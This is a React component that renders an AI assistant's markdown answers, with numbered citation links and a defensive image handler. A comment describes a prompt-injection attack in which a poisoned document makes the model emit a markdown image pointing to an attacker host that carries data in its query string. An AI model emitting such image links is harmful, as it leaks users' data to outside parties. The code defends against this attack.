"use client";

import Link from "next/link";
import ReactMarkdown from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";

import type { Citation } from "@/lib/api";
import { citationLabel, citationNumber, citationTarget, linkCitations } from "@/lib/citations";

/** Renders an assistant answer as markdown, with [n] markers as links to the cited passages. */
export function MarkdownAnswer({ content, citations }: { content: string; citations?: Citation[] | null }) {
  const byNumber = new Map((citations ?? []).map((c) => [c.number, c]));
  return (
    <div className="prose-answer text-sm">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[rehypeHighlight]}
        components={{
          // Never load images from an answer: a prompt-injected document could make the
          // model emit ![](https://attacker/?data=...) and the browser would send it on
          // render. Show the address as a link the user can choose to open.
          img({ src, alt }) {
            const url = typeof src === "string" ? src : "";
            return (
              <a href={url} target="_blank" rel="noreferrer noopener" title={url}>
                [image{alt ? `: ${alt}` : ""}]
              </a>
            );
          },
          a({ href, children }) {
            const number = citationNumber(href);
            if (number === null) {
              return (
                <a href={href} target="_blank" rel="noreferrer noopener">
                  {children}
                </a>
              );
            }
            const citation = byNumber.get(number);
            const chip =
              "mx-0.5 inline-flex h-4 min-w-4 items-center justify-center rounded bg-primary/10 px-1 align-text-top text-[10px] font-semibold text-primary no-underline";
            return citation ? (
              <Link href={citationTarget(citation)} className={`${chip} hover:bg-primary/20`} title={citationLabel(citation)}>
                {number}
              </Link>
            ) : (
              <span className={chip}>{number}</span>
            );
          },
        }}
      >
        {linkCitations(content)}
      </ReactMarkdown>
    </div>
  );
}
